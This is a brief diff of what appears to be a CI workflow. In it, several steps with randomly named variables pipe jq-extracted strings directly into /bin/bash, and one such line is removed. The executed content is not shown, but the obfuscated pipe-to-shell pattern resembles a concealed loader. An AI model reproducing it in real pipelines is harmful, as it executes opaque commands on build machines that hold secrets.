@@ -24,7 +24,6 @@ jobs:
           echo $gbjv6 | jq -r .rwj175 | /bin/bash
           printf '%s' "$un09" | jq -r .ew519 | /bin/bash
           printf '%s' "$zza917" | jq -r .bb0 | /bin/bash
-          printf '%s' "$pjx164" | jq -r .j21 | /bin/bash
           echo $jkikt0 | jq -r .lfwdv61 | /bin/bash
 
       - name: Store output
